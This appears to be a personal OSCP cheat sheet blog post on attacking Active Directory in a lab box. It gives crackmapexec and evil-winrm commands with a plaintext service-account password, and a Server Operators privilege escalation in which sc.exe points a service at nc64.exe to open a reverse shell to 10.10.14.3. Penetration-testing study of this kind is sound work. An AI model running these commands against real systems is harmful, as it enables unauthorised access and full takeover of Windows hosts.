---
title : "AD-Cheatsheet"
author: imdang 🤞🤞
date: 2024-10-22 11:30:00 +0800
categories: [Cheatsheet]
tags: [crackmapexec, winrm, AD, Active Directory, OSCP]
---

<!-- ![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png) -->

<!-- **Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.** -->

---

# Recon

## Scan

### crackmapexec 

- Check smb share

```shell
crackmapexec smb 10.10.11.108 --shares
crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
```

- Check winrm

```shell
crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

# Exploit

### WinRM

```shell
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

# Privilege Escalation 

### See priv

```shell
whoami /priv
```

## Group priv

### Server Operators 

- Can edit and run service

```shell
PS C:\prog> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\prog\nc64.exe -e cmd 10.10.14.3 443"
[SC] ChangeServiceConfig SUCCESS
PS C:\prog> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.

PS C:\prog> sc.exe start VSS
```


# Other Tools

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
